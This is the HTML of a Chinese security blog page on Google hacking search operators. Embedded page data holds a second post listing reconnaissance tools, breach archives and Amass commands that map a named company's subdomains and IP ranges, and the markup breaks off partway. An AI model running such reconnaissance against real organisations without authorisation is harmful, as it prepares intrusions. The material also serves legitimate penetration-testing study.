<!DOCTYPE html><html lang="zh-CN" class="vertical-scrollbar" data-astro-transition-scope="astro-smooz4hq-1"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><meta name="generator" content="Astro v5.16.6"><title>Google Hacking | Penetration | 应神上の博客</title><!-- Preconnect to third-party origins for faster resource loading --><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="preconnect" href="https://chinese-font.netlify.app" crossorigin><link rel="dns-prefetch" href="https://chinese-font.netlify.app"><!-- Async load Chinese fonts to avoid render-blocking --><link rel="stylesheet" href="/fonts/ChillRoundFRegular/result.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/fonts/ChillRoundFBold/result.css" media="print" onload="this.media='all'"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.QW52Ox2j.js"></script><style>.astro-loading-indicator {
  pointer-events: none;
  background-color: #e9536a;
  position: fixed;
  z-index: 1031;
  top: 0;
  left: 0;
  width: 100%;
  height: 2px;
  transition: transform 300ms ease-out, opacity 150ms 150ms ease-in;
	transform: translate3d(0, 0, 0) scaleX(var(--progress, 0));
  transform-origin: 0;
}

[dir="rtl"] .astro-loading-indicator {
  transform-origin: 100% 0;
}
</style><script>(function(){const className = "astro-loading-indicator";
const animationDuration = 300;
const threshold = 200;

(() => {
  let progress = 0.25
  let opacity = 0
  /** @type {number | undefined} */
  let trickleInterval = undefined
  /** @type {number | undefined} */
  let thresholdTimeout = undefined;

  const element = document.createElement("div")
  element.classList.add(className)
  element.ariaHidden = "true"

  /** @param {typeof progress} _progress */
  const setProgress = (_progress) => {
    progress = _progress
    element.style.setProperty('--progress', String(progress))
  }

  /** @param {typeof opacity} _opacity */
  const setOpacity = (_opacity) => {
    opacity = _opacity
    element.style.setProperty('opacity', String(opacity))
  }

  setOpacity(opacity)

  document.addEventListener("DOMContentLoaded", () => {
    document.body.prepend(element)
  })

  document.addEventListener("astro:before-preparation", () => {
    thresholdTimeout = setTimeout(() => {
      setOpacity(1)
      trickleInterval = window.setInterval(() => {
        setProgress(progress + Math.random() * 0.03)
      }, animationDuration)
    }, threshold)
  })

  document.addEventListener("astro:before-swap", (ev) => {
    if (!thresholdTimeout) {
      return
    }
    window.clearTimeout(thresholdTimeout)

    ev.newDocument.body.prepend(element)
    window.clearInterval(trickleInterval)
    trickleInterval = undefined

    setProgress(1)
    window.setTimeout(() => {
      setOpacity(0)
    }, animationDuration / 2)

    window.setTimeout(() => {
      setProgress(0.25)
    }, animationDuration * 2)
  })
})()
})();</script><script type="module" src="/_astro/Tooltips.astro_astro_type_script_index_0_lang.Bx2cGmPu.js"></script><!-- metadata --><meta name="description" content="site: 功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。 示例： site:zhihu.com 搜索跟知乎相关的网页 “web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页 “sql注入” site:csdn.net..."><meta name="author" content="Kaguya"><meta property="og:type" content="website"><meta property="og:site_name" content="Kaguya"><meta property="og:url" content="https://kaguyahi.github.io/blog/post/14/"><meta property="og:title" content="Google Hacking | Penetration | 应神上の博客"><meta property="og:description" content="site: 功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。 示例： site:zhihu.com 搜索跟知乎相关的网页 “web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页 “sql注入” site:csdn.net..."><!-- <meta property="og:image" content="/opengraph.png?v=1" /> TODO: og image--><meta name="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://kaguyahi.github.io/blog/post/14/"><meta name="twitter:title" content="Google Hacking | Penetration | 应神上の博客"><meta name="twitter:description" content="site: 功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。 示例： site:zhihu.com 搜索跟知乎相关的网页 “web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页 “sql注入” site:csdn.net..."><script>
      // 立即执行主题检查 否则会闪烁
      if (
        localStorage.theme === 'dark' ||
        (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
      ) {
        document.documentElement.classList.add('dark');
        document.documentElement.classList.remove('light');
        document.documentElement.dataset.theme = 'dark';
      } else {
        document.documentElement.classList.remove('dark');
        document.documentElement.classList.add('light');
        document.documentElement.dataset.theme = 'light';
      }
    </script><script>
      // iOS Safari pinch-zoom guard (viewport meta alone is not always respected)
      (() => {
        const blockGesture = (event) => event.preventDefault();
        document.addEventListener('gesturestart', blockGesture, { passive: false });
        document.addEventListener('gesturechange', blockGesture, { passive: false });
        document.addEventListener('gestureend', blockGesture, { passive: false });
      })();
    </script><!--主题检查切换对应值--><script type="module" src="/_astro/Layout.astro_astro_type_script_index_0_lang.c530qLiS.js"></script><!--FIXED:  SPA主题切换不渲染, tab栏切换变浅色问题。--><script type="module">function e(){localStorage.theme==="dark"||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?(document.documentElement.classList.add("dark"),document.documentElement.classList.remove("light"),document.documentElement.dataset.theme="dark"):(document.documentElement.classList.remove("dark"),document.documentElement.classList.add("light"),document.documentElement.dataset.theme="light")}document.addEventListener("astro:page-load",e);</script><link rel="stylesheet" href="/_astro/about.w_pREgQ8.css">
<link rel="stylesheet" href="/_astro/_slug_.D059aVq8.css">
<link rel="stylesheet" href="/_astro/about.CnCfUIIe.css">
<link rel="stylesheet" href="/_astro/index.Lf6pSiPd.css"><script type="module" src="/_astro/page.B5GOxY8C.js"></script><style>[data-astro-transition-scope="astro-smooz4hq-1"] { view-transition-name: root; }@layer astro { ::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style></head> <body> <div class="flex min-h-screen flex-col text-black dark:text-white"> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var a=(s,i,o)=>{let r=async()=>{await(await s())()},t=typeof i.value=="object"?i.value:void 0,c={rootMargin:t==null?void 0:t.rootMargin},n=new IntersectionObserver(e=>{for(let l of e)if(l.isIntersecting){n.disconnect(),r();break}},c);for(let e of o.children)n.observe(e)};(self.Astro||(self.Astro={})).visible=a;window.dispatchEvent(new Event("astro:visible"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="2hhkjW" prefix="r11" component-url="/_astro/Header.sTG9qsRM.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;isPostPage&quot;:[0,true],&quot;tocNumbering&quot;:[0,true],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;site&quot;],&quot;text&quot;:[0,&quot;site:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;filetype&quot;],&quot;text&quot;:[0,&quot;filetype:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;inurl&quot;],&quot;text&quot;:[0,&quot;inurl:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intitle&quot;],&quot;text&quot;:[0,&quot;intitle:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intext&quot;],&quot;text&quot;:[0,&quot;intext：&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;cache&quot;],&quot;text&quot;:[0,&quot;cache&quot;]}]]]}" ssr client="visible" opts="{&quot;name&quot;:&quot;Header&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/_astro/logo.Gai7gqE6.webp"/><div id="site-header" class="shadow-text fixed inset-x-0 top-0 z-10 gap-4 py-2.5 text-white select-none tablet:backdrop-blur tablet:py-2 tablet:pl-3 tablet:pr-3" style="view-transition-name:site-header"><div class="site-header-bg pointer-events-none absolute inset-0"></div><div class="relative z-10 mx-auto flex items-center justify-between px-6 tablet:w-full tablet:px-0 max-w-7xl"><a class="tablet:hidden -my-4 mr-4 flex cursor-pointer items-center justify-center gap-1 whitespace-nowrap" href="/blog" target="_self" title="Kaguya" aria-label="Kaguya" data-astro-transition-persist="page-header-avatar" style="view-transition-name:page-header-avatar"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="mt-2 mb-2 h-16"/></a><div class="tablet:flex w-full h-full tablet:grow hidden items-center justify-center"><a href="/blog" class="flex items-center gap-1"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="h-8" height="32"/></a></div><div class="tablet:grow-0 flex grow items-center" style="view-transition-name:page-header"><div class="tablet:hidden flex grow items-center gap-4"><a href="/blog" aria-label="首页" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-house-chimney" aria-hidden="true"></i>首页</a><button class="inline-flex h-10 items-center px-4 py-2 text-base tracking-wider relative after:absolute after:bottom-1 after:left-1/2 after:h-0.5 after:w-0 after:-translate-x-1/2 after:bg-white after:transition-all after:duration-300 after:content-[&quot;&quot;]" aria-expanded="false" aria-haspopup="dialog" aria-label="文章菜单"><i class="mr-1.5 text-sm fa-solid fa-pen-nib" aria-hidden="true"></i>文章<i class="fa-solid fa-caret-down absolute -right-1.5 text-xl transition-transform duration-300" aria-hidden="true"></i></button><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-regular fa-circle-user" aria-hidden="true"></i>关于</a></div><div class="ml-auto flex items-center gap-2"><button id="search-trigger" class="group cursor-pointer transition duration-300 hover:scale-125" aria-label="搜索" title="搜索 (⌘K)"><i class="fa-solid fa-magnifying-glass text-2xl" aria-hidden="true"></i></button><div id="search-component-portal" style="display:none;position:absolute;pointer-events:none;visibility:hidden"><div id="search-for-dialog" class="pagefind-ui" data-pagefind-ui="true"></div></div><style>
        .scroll-feather-mask {
          container-type: scroll-state;
        }
        @container scroll-state(scrollable: bottom) {
          .scroll-feather-mask::before {
            content: '';
            background: linear-gradient(
              to bottom,
              transparent 0%,
              var(--gradient-bg-start) var(--scroll-mask-middle, 70%),
              var(--gradient-bg-start) var(--scroll-mask-end, 100%)
            );
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 10;
            display: block;
            height: var(--scroll-mask-height, 5rem);
          }
        }
      </style><button class="theme-toggle text-2xl cursor-pointer bg-transparent border-0 p-0 transition-transform duration-300 hover:scale-110" id="theme-toggle-btn" type="button" aria-label="toggle theme" aria-pressed="false"><i class="fa-solid fa-sun text-2xl light-icon transition-all duration-300" style="opacity:1;transform:rotate(0deg) scale(1)"></i><i class="fa-solid fa-moon text-2xl dark-icon transition-all duration-300" style="opacity:0;transform:rotate(-180deg) scale(0)"></i></button><style>
        .theme-toggle {
          position: relative;
          z-index: 10;
          width: 36px;
          height: 36px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .theme-toggle i {
          position: absolute;
          text-shadow: none;
          filter: none;
        }
      </style></div></div></div></div><!--astro:end--></astro-island> <main class="relative flex grow flex-col gap-4">   <div class="flex flex-col"> <div class="relative flex h-[60dvh] max-h-200 overflow-hidden"> <div class="absolute inset-0 h-full bg-black/40"></div> <div class="absolute inset-0 bottom-[8dvh] flex flex-col items-center justify-center px-5 text-white">  <h1 class="shadow-text word-break text-4.5xl text-center font-bold md:text-2xl max-w-7xl flex flex-wrap items-center justify-center gap-3"> Google Hacking  </h1> <p class="mt-3 flex items-center justify-center gap-4 md:text-xs"> <span class="flex items-center gap-1"> <i class="fa-regular fa-calendar-days" aria-hidden="true"></i>
发表于 2026-01-03 </span> <span class="flex items-center gap-1"> <i class="fa-solid fa-pen-nib" aria-hidden="true"></i> 482 字
</span> <span class="flex items-center gap-1"> <i class="fa-regular fa-clock" aria-hidden="true"></i> 3 min read </span> </p> </div> <div class="relative -z-10 h-full min-h-60 w-full" data-astro-transition-persist="page-cover-banner" id="banner-box" style="background-image:linear-gradient(135deg, #373e48 0%, #46484c 50%, #292522 100%)"> <img src="/img/backgrounds/imgi_14_8C104FXJF0XfZKYW.webp" alt="cover" class="h-full w-full object-cover" sizes="50vw"> </div> <div class="wave-wrap"><svg class="wave" xmlns="http://www.w3.org/2000/svg" viewBox="0 24 150 28" preserveAspectRatio="none"><defs><path id="gentle-wave" d="m -160,44.4 c 30,0 58,-18 87.7,-18 30.3,0 58.3,18 87.3,18 30,0 58,-18 88,-18 30,0 58,18 88,18 l 0,34.5 -351,0 z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="50" y="0" fill="rgba(255, 255, 255, 0.48)"></use><use xlink:href="#gentle-wave" x="50" y="3" fill="rgba(255, 255, 255, 0.78)"></use><use xlink:href="#gentle-wave" x="50" y="6" fill="rgba(255, 255, 255, 0.8)"></use></g></svg></div> </div> <div class="mx-auto md:mx-0 flex w-full items-start justify-center md:w-full max-w-7xl"> <div class="page-home-sider shadow-home-sider sticky top-0 self-start flex min-w-64 max-w-64 flex-col tablet:hidden overflow-hidden h-screen min-h-0 items-center px-2" transition:name="page-home-sider"> <script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();</script><astro-island uid="1g5WGS" prefix="r10" component-url="/_astro/HomeSiderPanel.D_zmuAB0.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/724d7fb480c8ac0db472ca5c7e36d239.jpg&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,20],&quot;categoryCount&quot;:[0,4],&quot;tagCount&quot;:[0,20],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;首页&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-house-chimney&quot;]}],[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;],&quot;children&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}]]]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-regular fa-circle-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/14/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;site&quot;],&quot;text&quot;:[0,&quot;site:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;filetype&quot;],&quot;text&quot;:[0,&quot;filetype:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;inurl&quot;],&quot;text&quot;:[0,&quot;inurl:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intitle&quot;],&quot;text&quot;:[0,&quot;intitle:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intext&quot;],&quot;text&quot;:[0,&quot;intext：&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;cache&quot;],&quot;text&quot;:[0,&quot;cache&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/一些情报源&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 云信息\n```\nAliyun、AWS、GCP、Azure等\n查找可公开访问的实例\nhttps://github.com/gwen001/s3-buckets-finder\nhttps://github.com/nccgroup/aws-inventory\nhttps://github.com/jordanpotti/AWSBucketDump\n```\n# APP反编译\n```\nurl、js、osskey、api等信息查找\n搜集到接口Fuzz常见参数\n```\n# C段/B段信息\n```\nBanner、是否存在目标的后台或其他入口/其他业务系统\n```\n# 工具\n```\nrecon-ng,theharvester,maltego,exiftool等\nhttps://www.spiderfoot.net/\nhttps://github.com/smicallef/spiderfoot\n```\n# 网页缓存\n```\nhttp://www.cachedpages.com/\nhttps://archive.org/web\n```\n# 图片反查\n```\n百度识图、googleimage、tineye\n原图查询坐标\n```\n# Github/Gitee等代码托管平台\n```\nhttps://github.com/dxa4481/truffleHog\nhttps://github.com/lijiejie/GitHack\nhttps://github.com/MiSecurity/x-patrol\nhttps://github.com/az0ne/Github_Nuggests\nhttps://github.com/0xbug/Hawkeye\nhttps://github.com/mazen160/GithubCloner 克隆用户的github\nhttps://github.com/michenriksen/gitrob.git\n```\n# 被入侵网址列表\n```\nhttp://zone-h.org/archive\nwooyun镜像查找目标企业曾出现的漏洞\nhttp://wooyun.2xss.cc/\n```\n# Amass 深入的击面映射和资产发现\n```\nhttps://github.com/OWASP/Amass \n  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp; CIDR IP Range of a Company\n  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp; IP Address from ASN\n  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN \n  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang\n  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp; whois\n  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp; asn\n```\n# 威胁情报平台\n```\nVirustotal：https://www.virustotal.com/gui/home/upload\n腾讯哈勃分析系统：https://habo.qq.com/tool/index\n微步在线威胁情报：https://x.threatbook.cn/\n奇安信威胁情报：https://ti.qianxin.com/\n360威胁情报：https://ti.360.net/#/homepage\n安恒威胁情报：https://ti.dbappsecurity.com.cn/\n火线安全平台：https://www.huoxian.cn\nHacking8安全信息流：https://i.hacking8.com/\n零零信安：https://0.zone\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/一些情报源.md&quot;],&quot;digest&quot;:[0,&quot;ed23490867e26891&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;云信息\&quot;&gt;云信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#云信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Aliyun、AWS、GCP、Azure等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查找可公开访问的实例&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/gwen001/s3-buckets-finder&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/nccgroup/aws-inventory&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/jordanpotti/AWSBucketDump&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;app反编译\&quot;&gt;APP反编译&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#app反编译\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;url、js、osskey、api等信息查找&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;搜集到接口Fuzz常见参数&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;c段b段信息\&quot;&gt;C段/B段信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#c段b段信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Banner、是否存在目标的后台或其他入口/其他业务系统&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;工具\&quot;&gt;工具&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#工具\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;recon-ng,theharvester,maltego,exiftool等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.spiderfoot.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span 